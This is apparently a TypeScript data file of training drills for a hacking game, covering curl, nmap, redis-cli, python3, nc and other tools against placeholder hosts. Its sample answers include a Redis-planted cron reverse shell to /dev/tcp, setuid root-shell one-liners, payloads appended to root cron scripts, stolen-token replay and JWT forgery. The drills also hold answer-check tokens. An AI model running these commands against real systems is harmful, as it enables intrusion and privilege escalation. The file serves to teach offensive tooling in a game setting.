/**
 * Training Mode content — a study guide for the real-world tools this game actually uses.
 * Ranked by usage across every mission's `tool:` field (see lib/game/chains/**). Decoupled
 * from ChainDef/NodeDef/ObjectiveDef on purpose: no map coordinates, no points economy, no
 * mission unlock ordering — just "what does this tool's syntax look like, can you write it."
 */

export interface TrainingDrill {
  id: string;
  scenario: string;
  /** tokens checked against the typed answer via checkDrillAnswer() — substring match after normalize() */
  accepted: { requires: string[]; forbids?: string[] };
  /** canonical answer, shown on reveal or after a correct submit */
  sampleAnswer: string;
  /** one-line "why this flag" note shown alongside the sample answer */
  explain: string;
}

export interface TrainingTool {
  id: string;
  rank: number;
  name: string;
  useCount: number;
  blurb: string;
  /** set when the game only ever uses one fixed invocation of this tool (e.g. nmap's -sV) */
  canonicalForm?: string;
  referenceBlock: string[];
  drills: TrainingDrill[];
}

export interface TrainingData {
  tools: TrainingTool[];
}

export const training: TrainingData = {
  tools: [
    {
      id: "curl",
      rank: 1,
      name: "curl",
      useCount: 136,
      blurb:
        "HTTP client — the single most-used tool in this game. Recon, auth bypass, API abuse, and exfiltration all run through curl.",
      referenceBlock: [
        "curl http://<ip>/path                                        — plain GET",
        'curl -X POST http://<ip>/path -d "key=value&key2=value2"      — POST a form body',
        'curl -H "Authorization: Bearer <token>" https://<ip>/api/...  — replay a bearer token',
        'curl -i -H "Cookie: session=<value>" http://<ip>/admin        — replay a session cookie, show headers',
      ],
      drills: [
        {
          id: "curl-01",
          scenario: "Fetch the root page of a web app running on port 8080 at 10.10.10.5.",
          accepted: { requires: ["curl", "10.10.10.5:8080"] },
          sampleAnswer: "curl http://10.10.10.5:8080/",
          explain: "A bare curl <url> issues a GET request and prints the response body.",
        },
        {
          id: "curl-02",
          scenario: "POST a login attempt with username 'admin' and password 'letmein' to http://<ip>/login.",
          accepted: { requires: ["curl", "-x post", "-d", "admin", "letmein"] },
          sampleAnswer: 'curl -X POST http://<ip>/login -d "username=admin&password=letmein"',
          explain:
            "-X POST sets the method; -d sends the body as form-encoded key=value pairs, matching how every API in this game expects it.",
        },
        {
          id: "curl-03",
          scenario: "You have a stolen bearer token 'abc123'. Use it to hit the admin API at https://<ip>/api/admin.",
          accepted: { requires: ["curl", "-h", "authorization", "bearer", "abc123", "/api/admin"] },
          sampleAnswer: 'curl -H "Authorization: Bearer abc123" https://<ip>/api/admin',
          explain: "-H adds a raw header; Authorization: Bearer <token> is the standard way to replay a stolen API token.",
        },
        {
          id: "curl-04",
          scenario:
            "You captured a session cookie value 'a1f9c2e7'. Replay it as a Cookie header against http://<ip>/admin, and show response headers too.",
          accepted: { requires: ["curl", "-i", "-h", "cookie", "a1f9c2e7", "/admin"] },
          sampleAnswer: 'curl -i -H "Cookie: session=a1f9c2e7" http://<ip>/admin',
          explain: "-i prints response headers along with the body — useful for confirming a replayed session actually authenticated.",
        },
      ],
    },
    {
      id: "nmap",
      rank: 2,
      name: "nmap",
      useCount: 53,
      blurb: "Network/service scanner — always the first move on a new target. This game only ever needs one form of it.",
      canonicalForm: "nmap -sV <ip>",
      referenceBlock: ["nmap -sV <ip>   — service/version scan, the form this game always expects"],
      drills: [
        {
          id: "nmap-01",
          scenario: "Scan 10.10.10.20 for open services and their versions.",
          accepted: { requires: ["nmap", "-sv", "10.10.10.20"] },
          sampleAnswer: "nmap -sV 10.10.10.20",
          explain: "-sV probes open ports to determine the service and version banner running there.",
        },
        {
          id: "nmap-02",
          scenario: "Write the general form of that same scan against a placeholder target <ip>.",
          accepted: { requires: ["nmap", "-sv", "<ip>"] },
          sampleAnswer: "nmap -sV <ip>",
          explain: "This exact invocation is what every mission's recon objective expects — memorize this one form.",
        },
        {
          id: "nmap-03",
          scenario:
            "(Beyond this game, real-world nmap) Scan only ports 22, 80, and 443 on <ip> instead of the full range, still grabbing versions.",
          accepted: { requires: ["nmap", "-sv", "-p", "22", "80", "443", "<ip>"] },
          sampleAnswer: "nmap -sV -p 22,80,443 <ip>",
          explain:
            "-p restricts the scan to specific ports — much faster against a known service set. This game only ever uses the full -sV scan, but real engagements often narrow scope like this.",
        },
      ],
    },
    {
      id: "cat",
      rank: 3,
      name: "cat",
      useCount: 20,
      blurb: "Prints file contents — the final step of nearly every objective: reading flags, configs, leaked source, and creds off disk.",
      referenceBlock: ["cat <file>", "cat /etc/passwd", "cat local.txt"],
      drills: [
        {
          id: "cat-01",
          scenario: "You have a shell. Print the contents of local.txt in the current directory.",
          accepted: { requires: ["cat", "local.txt"] },
          sampleAnswer: "cat local.txt",
          explain: "cat with no flags just dumps the whole file to stdout — exactly what you want for a flag file.",
        },
        {
          id: "cat-02",
          scenario: "Read a leaked app config at /var/www/config.php.",
          accepted: { requires: ["cat", "/var/www/config.php"] },
          sampleAnswer: "cat /var/www/config.php",
          explain: "Absolute paths work the same as relative ones — cat the full path once you know it from an LFI or directory listing.",
        },
        {
          id: "cat-03",
          scenario: "Print /etc/passwd to enumerate local user accounts.",
          accepted: { requires: ["cat", "/etc/passwd"] },
          sampleAnswer: "cat /etc/passwd",
          explain: "/etc/passwd is world-readable on virtually every Linux box — one of the first files worth reading with any file-read primitive.",
        },
      ],
    },
    {
      id: "grep",
      rank: 4,
      name: "grep",
      useCount: 7,
      blurb:
        "Text filter — almost never run alone in this game. It's piped after nmap, objdump, and strings to cut noisy output down to the one line that matters.",
      referenceBlock: [
        "<command> | grep <pattern>          — keep only matching lines",
        "objdump -d ./binary | grep system    — find a call to a specific function",
        "strings -a -t x ./binary | grep /bin/sh  — find where a string constant is referenced",
      ],
      drills: [
        {
          id: "grep-01",
          scenario: "Disassemble telemetryd and keep only lines mentioning 'system'.",
          accepted: { requires: ["objdump", "-d", "./telemetryd", "grep", "system"] },
          sampleAnswer: "objdump -d ./telemetryd | grep system",
          explain: "The pipe (|) feeds one command's stdout into grep's stdin — grep then prints only the lines containing your pattern.",
        },
        {
          id: "grep-02",
          scenario: "Dump strings from ./telemetryd with offsets, keeping only the line referencing /bin/sh.",
          accepted: { requires: ["strings", "-a", "-t x", "./telemetryd", "grep", "/bin/sh"] },
          sampleAnswer: "strings -a -t x ./telemetryd | grep /bin/sh",
          explain: "Piping strings into grep is the fastest way to locate one known string among thousands of lines of noise.",
        },
        {
          id: "grep-03",
          scenario: "Find a ROP gadget containing the exact instruction 'pop rdi' out of a full gadget dump.",
          accepted: { requires: ["ropgadget", "--binary", "grep", "pop rdi"] },
          sampleAnswer: "ROPgadget --binary ./telemetryd | grep 'pop rdi'",
          explain: "Wrapping the search term in quotes keeps the space in 'pop rdi' intact as a single grep argument.",
        },
      ],
    },
    {
      id: "python3",
      rank: 5,
      name: "python3",
      useCount: 6,
      blurb: "One-liners for privilege escalation and exploit scripting — this game uses it for setuid tricks and JWT forgery.",
      referenceBlock: [
        'python3.9 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        "python3 -c \"import jwt; print(jwt.encode({'role':'admin'}, key, algorithm='HS256'))\"",
      ],
      drills: [
        {
          id: "python3-01",
          scenario: "A binary has cap_setuid set. Use python3.9 to set your UID to 0 and drop into a root shell.",
          accepted: { requires: ["python3", "-c", "os.setuid(0)", "os.system"] },
          sampleAnswer: 'python3.9 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
          explain: "os.setuid(0) works because the binary itself carries the cap_setuid capability — the OS honors the request with no further check.",
        },
        {
          id: "python3-02",
          scenario: "Forge a JWT with role=admin, signed with a key you already have, using HS256.",
          accepted: { requires: ["python3", "jwt.encode", "hs256"] },
          sampleAnswer: "python3 -c \"import jwt; print(jwt.encode({'role':'admin'}, key, algorithm='HS256'))\"",
          explain: "jwt.encode() takes the payload dict, signing key, and algorithm — HS256 (symmetric) is what you use once you've obtained the secret.",
        },
        {
          id: "python3-03",
          scenario: "Spin up a quick local HTTP server on port 8000 to stage a payload file for a target to pull.",
          accepted: { requires: ["python3", "-m", "http.server", "8000"] },
          sampleAnswer: "python3 -m http.server 8000",
          explain: "A one-liner static file server — handy for staging a payload the target can pull with curl or wget.",
        },
      ],
    },
    {
      id: "objdump",
      rank: 6,
      name: "objdump",
      useCount: 6,
      blurb: "Disassembler — used throughout binary exploitation missions to find gadgets, hidden functions, and dangerous format-string sinks.",
      referenceBlock: [
        "objdump -d ./binary            — full disassembly",
        "objdump -d ./binary | grep system — find calls to a specific function",
        "objdump -R ./binary            — dynamic relocations (PLT/GOT entries)",
        "objdump -t ./binary            — symbol table",
      ],
      drills: [
        {
          id: "objdump-01",
          scenario: "Disassemble the binary netdiagd to look for a helpful call.",
          accepted: { requires: ["objdump", "-d", "./netdiagd"] },
          sampleAnswer: "objdump -d ./netdiagd",
          explain: "-d disassembles executable sections — your starting point for finding gadgets or dangerous calls.",
        },
        {
          id: "objdump-02",
          scenario: "Disassemble telemetryd and filter just for references to the 'system' function.",
          accepted: { requires: ["objdump", "-d", "./telemetryd", "grep", "system"] },
          sampleAnswer: "objdump -d ./telemetryd | grep system",
          explain: "Piping to grep narrows a huge disassembly dump down to the one call you actually care about.",
        },
        {
          id: "objdump-03",
          scenario: "Check diagd's dynamic relocations to see what external functions it imports.",
          accepted: { requires: ["objdump", "-r", "./diagd"] },
          sampleAnswer: "objdump -R ./diagd",
          explain: "-R shows the PLT/GOT entries — the functions resolved at runtime, useful for GOT-overwrite style exploits.",
        },
        {
          id: "objdump-04",
          scenario: "Dump profiled's symbol table looking for a suspicious internal struct type name.",
          accepted: { requires: ["objdump", "-t", "./profiled"] },
          sampleAnswer: "objdump -t ./profiled",
          explain: "-t lists the symbol table — function and data symbol names, sometimes revealing 'hidden' functions never called from main().",
        },
      ],
    },
    {
      id: "nc",
      rank: 7,
      name: "nc",
      useCount: 5,
      blurb: "Netcat — raw TCP client, used here to interact with vulnerable network services directly (format-string bugs, custom listeners).",
      referenceBlock: ["nc <ip> <port>", 'echo "<payload>" | nc <ip> <port>'],
      drills: [
        {
          id: "nc-01",
          scenario: "Connect directly to a custom service listening on port 7878 at <ip>.",
          accepted: { requires: ["nc", "<ip>", "7878"] },
          sampleAnswer: "nc <ip> 7878",
          explain: "Bare nc <host> <port> opens a raw TCP connection and drops you into an interactive read/write session with whatever's listening.",
        },
        {
          id: "nc-02",
          scenario: "Pipe a crafted format-string payload straight into a service on port 6060 without opening an interactive session.",
          accepted: { requires: ["echo", "nc", "6060"] },
          sampleAnswer: 'echo "AAAA%p%p%p%p%p%p" | nc <ip> 6060',
          explain: "Piping echo's output into nc sends one payload and lets the connection close — exactly what you want for a single probe.",
        },
      ],
    },
    {
      id: "echo",
      rank: 8,
      name: "echo",
      useCount: 5,
      blurb:
        "Used constantly to build one-off payloads — either piped into nc for network probes, or redirected into a file to hijack something that runs later.",
      referenceBlock: ["echo '<payload>' > <file>", "echo '<payload>' >> <file>", "echo '<payload>' | nc <ip> <port>"],
      drills: [
        {
          id: "echo-01",
          scenario:
            "You control a world-writable env file sourced by a root cron job. Write a payload into /tmp/backup.env that copies bash to /tmp/rootbash and sets the setuid bit.",
          accepted: { requires: ["echo", "cp /bin/bash", "chmod u+s", "/tmp/backup.env"] },
          sampleAnswer: "echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' > /tmp/backup.env",
          explain:
            "Redirecting echo's output with > overwrites the target file with your payload — the classic way to plant a privesc one-liner into something that'll run as root later.",
        },
        {
          id: "echo-02",
          scenario: "Append (don't overwrite) the same kind of payload to a writable cron script at /opt/netdiag/cleanup.sh.",
          accepted: { requires: ["echo", "cp /bin/bash", "chmod u+s", ">>", "/opt/netdiag/cleanup.sh"] },
          sampleAnswer: "echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' >> /opt/netdiag/cleanup.sh",
          explain: ">> appends instead of truncating — critical when the script needs to still run correctly for the cron job to actually execute your addition.",
        },
        {
          id: "echo-03",
          scenario:
            "Send a repeated-%x probe string into a suspected format-string-vulnerable service on port 6060, without opening an interactive nc session.",
          accepted: { requires: ["echo", "%x%x%x%x", "nc", "6060"] },
          sampleAnswer: 'echo "%x%x%x%x" | nc <ip> 6060',
          explain: "Piping a short repeating %x pattern is the fastest way to confirm a format-string bug is reachable before building a real payload.",
        },
      ],
    },
    {
      id: "redis-cli",
      rank: 9,
      name: "redis-cli",
      useCount: 4,
      blurb: "Redis's own CLI client — this game uses it to abuse unauthenticated Redis instances into planting a cron-based reverse shell.",
      referenceBlock: [
        "redis-cli -h <ip> ping",
        "redis-cli -h <ip> config set dir /etc/cron.d/",
        "redis-cli -h <ip> config set dbfilename backdoor",
        'redis-cli -h <ip> set payload "* * * * * root /bin/bash -c \'...\'"',
        "redis-cli -h <ip> save",
      ],
      drills: [
        {
          id: "redis-cli-01",
          scenario: "Check whether Redis at <ip> is reachable and unauthenticated.",
          accepted: { requires: ["redis-cli", "-h", "<ip>", "ping"] },
          sampleAnswer: "redis-cli -h <ip> ping",
          explain: "A bare PING that returns PONG with no password prompt confirms the instance has zero auth — wide open.",
        },
        {
          id: "redis-cli-02",
          scenario: "Point Redis's working directory at the system cron directory so any file it writes lands there.",
          accepted: { requires: ["redis-cli", "-h", "<ip>", "config set dir", "/etc/cron.d/"] },
          sampleAnswer: "redis-cli -h <ip> config set dir /etc/cron.d/",
          explain: "CONFIG SET dir changes where Redis's next SAVE will write its dump file — retargeting it to a cron directory is the whole trick.",
        },
        {
          id: "redis-cli-03",
          scenario: "Set a Redis key whose value is a valid crontab line running a reverse shell as root every minute.",
          accepted: { requires: ["redis-cli", "-h", "<ip>", "set payload"] },
          sampleAnswer: "redis-cli -h <ip> set payload \"* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/op/4444 0>&1'\"",
          explain: "The key's value becomes the literal file contents once saved — it has to be a syntactically valid crontab line, not just any string.",
        },
        {
          id: "redis-cli-04",
          scenario: "Force Redis to write its current dataset to disk now, completing the plant.",
          accepted: { requires: ["redis-cli", "-h", "<ip>", "save"] },
          sampleAnswer: "redis-cli -h <ip> save",
          explain: "SAVE writes the in-memory dataset to the dbfilename/dir you just configured — this is the moment the cron file actually gets created.",
        },
      ],
    },
    {
      id: "checksec",
      rank: 10,
      name: "checksec",
      useCount: 4,
      blurb: "Reports which binary protections (canary, NX, PIE, RELRO) are enabled — the first thing to run against any exploitation target.",
      referenceBlock: ["checksec ./binary"],
      drills: [
        {
          id: "checksec-01",
          scenario: "Check what protections are compiled into ./netdiagd before planning an exploit.",
          accepted: { requires: ["checksec", "./netdiagd"] },
          sampleAnswer: "checksec ./netdiagd",
          explain:
            "checksec's output (canary/NX/PIE/RELRO) tells you immediately which exploitation techniques are even possible — e.g. no canary means a simple stack overflow can work.",
        },
        {
          id: "checksec-02",
          scenario: "Same check, this time against ./diagd.",
          accepted: { requires: ["checksec", "./diagd"] },
          sampleAnswer: "checksec ./diagd",
          explain: "Always run this before objdump/gdb — it shapes every decision that follows.",
        },
      ],
    },
    {
      id: "aws",
      rank: 11,
      name: "aws",
      useCount: 4,
      blurb: "AWS CLI — used in campaign-tier missions for IAM/STS privilege pivoting between roles and accounts.",
      referenceBlock: [
        "aws sts assume-role --role-arn <arn> --role-session-name <name>",
        "aws iam list-role-policies --role-name <name>",
        "aws secretsmanager list-secrets",
      ],
      drills: [
        {
          id: "aws-01",
          scenario: "Assume the role arn:aws:iam::palermo:role/vendor-integration, naming the session 'pivot'.",
          accepted: {
            requires: [
              "aws sts assume-role",
              "--role-arn",
              "arn:aws:iam::palermo:role/vendor-integration",
              "--role-session-name",
              "pivot",
            ],
          },
          sampleAnswer: "aws sts assume-role --role-arn arn:aws:iam::palermo:role/vendor-integration --role-session-name pivot",
          explain: "assume-role exchanges your current credentials for temporary ones scoped to the target role — the core primitive of any cloud privilege pivot.",
        },
        {
          id: "aws-02",
          scenario: "List what policies are attached to the vendor-integration role you're currently running as, to see what it can do next.",
          accepted: { requires: ["aws iam list-role-policies", "--role-name", "vendor-integration"] },
          sampleAnswer: "aws iam list-role-policies --role-name vendor-integration",
          explain: "You need --role-name to target a specific role — this reveals the next hop in a privilege chain.",
        },
        {
          id: "aws-03",
          scenario: "List every secret stored in Secrets Manager for the current credentials.",
          accepted: { requires: ["aws secretsmanager list-secrets"] },
          sampleAnswer: "aws secretsmanager list-secrets",
          explain: "Once you've pivoted into a role with secretsmanager access, this is the first command worth running — no name/ARN needed to just enumerate.",
        },
      ],
    },
    {
      id: "ssh",
      rank: 12,
      name: "ssh",
      useCount: 3,
      blurb: "Remote shell access — the payoff of nearly every credential-recovery objective in the game.",
      referenceBlock: ["ssh <user>@<ip>", "ssh -i <keyfile> <user>@<ip>"],
      drills: [
        {
          id: "ssh-01",
          scenario: "You recovered credentials for user rbadmin. Log into <ip> over SSH.",
          accepted: { requires: ["ssh", "rbadmin", "<ip>"] },
          sampleAnswer: "ssh rbadmin@<ip>",
          explain: "user@host is the standard SSH target syntax — you'll be prompted for the password interactively.",
        },
        {
          id: "ssh-02",
          scenario: "You recovered a private key file vantage_jumpbox_key instead of a password. Use it to log in as admin.",
          accepted: { requires: ["ssh", "-i", "vantage_jumpbox_key", "admin", "<ip>"] },
          sampleAnswer: "ssh -i vantage_jumpbox_key admin@<ip>",
          explain: "-i points ssh at a specific private key file instead of prompting for a password.",
        },
      ],
    },
    {
      id: "sudo",
      rank: 13,
      name: "sudo",
      useCount: 1,
      blurb: "Privilege escalation gateway — checking what you're allowed to run as another user is the single most valuable privesc command there is.",
      referenceBlock: ["sudo -l   — check what you can run as another user"],
      drills: [
        {
          id: "sudo-01",
          scenario: "You have a shell. Check what commands your user is allowed to run via sudo.",
          accepted: { requires: ["sudo", "-l"] },
          sampleAnswer: "sudo -l",
          explain: "-l lists every rule that applies to you — often revealing a specific binary you can run as root, which is your privesc path.",
        },
      ],
    },
    {
      id: "find",
      rank: 14,
      name: "find",
      useCount: 1,
      blurb: "Filesystem search — this game uses it to sweep the whole disk for SUID binaries, one of the fastest privesc recon steps.",
      referenceBlock: ["find / -perm -4000 -type f 2>/dev/null   — every SUID binary on the box"],
      drills: [
        {
          id: "find-01",
          scenario: "Search the entire filesystem for SUID binaries, silencing permission-denied noise.",
          accepted: { requires: ["find", "/", "-perm", "-4000", "-type f"] },
          sampleAnswer: "find / -perm -4000 -type f 2>/dev/null",
          explain: "-perm -4000 matches the SUID bit; 2>/dev/null throws away the flood of \"permission denied\" errors from directories you can't read.",
        },
      ],
    },
    {
      id: "strings",
      rank: 15,
      name: "strings",
      useCount: 1,
      blurb: "Pulls printable text out of a binary — a fast way to spot hardcoded paths, commands, or secrets without disassembling anything.",
      referenceBlock: ["strings -a -t x ./binary | grep <pattern>   — printable strings with offsets, filtered to one"],
      drills: [
        {
          id: "strings-01",
          scenario: "Pull every printable string out of telemetryd with its offset, keeping only the reference to /bin/sh.",
          accepted: { requires: ["strings", "-a", "-t x", "./telemetryd", "grep", "/bin/sh"] },
          sampleAnswer: "strings -a -t x ./telemetryd | grep /bin/sh",
          explain: "-t x prints each string's offset in hex — you'll need that offset to know exactly where in the binary the string lives.",
        },
      ],
    },
    {
      id: "whoami",
      rank: 16,
      name: "whoami",
      useCount: 1,
      blurb: "The simplest post-exploitation check there is — confirm which user your shell is actually running as before doing anything else.",
      referenceBlock: ["whoami"],
      drills: [
        {
          id: "whoami-01",
          scenario: "You just landed a shell through a web exploit. Confirm which user it's running as.",
          accepted: { requires: ["whoami"] },
          sampleAnswer: "whoami",
          explain: "No flags, no arguments — just confirms your effective user, which tells you immediately whether you already have root or still need to escalate.",
        },
      ],
    },
    {
      id: "gobuster",
      rank: 17,
      name: "gobuster",
      useCount: 2,
      blurb: "Directory brute-forcer — finds hidden paths on a web server that aren't linked from anywhere visible.",
      referenceBlock: ["gobuster dir -u http://<ip> -w <wordlist>"],
      drills: [
        {
          id: "gobuster-01",
          scenario: "Brute-force hidden directories on http://<ip> using the common.txt wordlist.",
          accepted: { requires: ["gobuster dir", "-u", "http://<ip>", "-w", "common.txt"] },
          sampleAnswer: "gobuster dir -u http://<ip> -w common.txt",
          explain: "dir mode requests every word in the wordlist as a path and reports which ones return a real response instead of a 404.",
        },
      ],
    },
  ],
};
